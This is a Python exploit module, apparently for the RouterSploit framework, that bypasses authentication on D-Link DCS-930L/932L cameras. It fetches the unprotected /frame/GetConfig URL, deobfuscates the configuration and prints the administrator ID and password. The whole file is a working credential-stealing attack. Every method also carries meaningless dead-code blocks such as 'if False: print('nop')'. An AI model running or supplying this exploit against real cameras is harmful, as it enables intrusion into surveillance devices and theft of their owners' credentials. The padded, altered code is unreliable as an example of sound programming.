import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'D-Link DCS Cameras Authentication Bypass', 'description': 'D-Link DCS web cameras allow unauthenticated attackers to obtain the configuration of the device remotely. A copy of the device configuration can be obtained by accessing unprocteted URL. ', 'authors': ('Roberto Paleari', 'Dino Causevic'), 'references': ('https://www.exploit-db.com/exploits/24442/',), 'devices': ('D-Link DCS-930L, firmware version 1.04', 'D-Link DCS-932L, firmware version 1.02')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(8080, 'Target HTTP port')

    def __init__(self):
        if False:
            i = 10
            return i + 15
        self.config_content = None

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        if self.check():
            print_success('Target appears to be vulnerable.')
            admin_id = None
            admin_password = None
            if self.config_content and len(self.config_content):
                for line in self.config_content.split('\n'):
                    line = line.strip()
                    m_groups = re.match('AdminID=(.*)', line, re.I | re.M)
                    if m_groups:
                        print_success('Found Admin ID.')
                        admin_id = m_groups.group(1)
                    m_groups = re.match('AdminPassword=(.*)', line, re.I | re.M)
                    if m_groups:
                        print_success('Found Admin password.')
                        admin_password = m_groups.group(1)
                        break
                print_table(('AdminId', 'Password'), (admin_id, admin_password))
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        response = self.http_request(method='GET', path='/frame/GetConfig')
        if response and response.status_code == 200 and len(response.content):
            self.config_content = self._deobfuscate(response.content)
            if self.config_content and any([x in self.config_content for x in ['AdminID=', 'AdminPassword=']]):
                return True
        return False

    def _deobfuscate(self, config):
        if False:
            i = 10
            return i + 15

        def chain(lambdas, value):
            if False:
                print('Hello World!')
            r_chain = None
            for lambda_function in lambdas:
                r_chain = value = lambda_function(value)
            return r_chain
        arr_c = [chain([lambda d: d + ord('y') & 255, lambda d: (d ^ ord('Z')) & 255, lambda d: d - ord('e') & 255], t) for t in config]
        arr_c_len = len(arr_c)
        tmp = (arr_c[arr_c_len - 1] & 7) << 5 & 255
        for t in reversed(range(arr_c_len)):
            if t == 0:
                ct = chain([lambda d: d >> 3 & 255, lambda d: d + tmp & 255], arr_c[t])
            else:
                ct = (arr_c[t] >> 3 & 255) + ((arr_c[t - 1] & 7) << 5 & 255) & 255
            arr_c[t] = ct
        tmp_str = ''.join(map(chr, arr_c))
        ret_str = ''
        if len(tmp_str) % 2 != 0:
            print_error("Config file can't be deobfuscated.")
            return None
        half_str_len = int(len(tmp_str) / 2)
        for i in range(half_str_len):
            ret_str += tmp_str[i + half_str_len] + tmp_str[i]
        return ret_str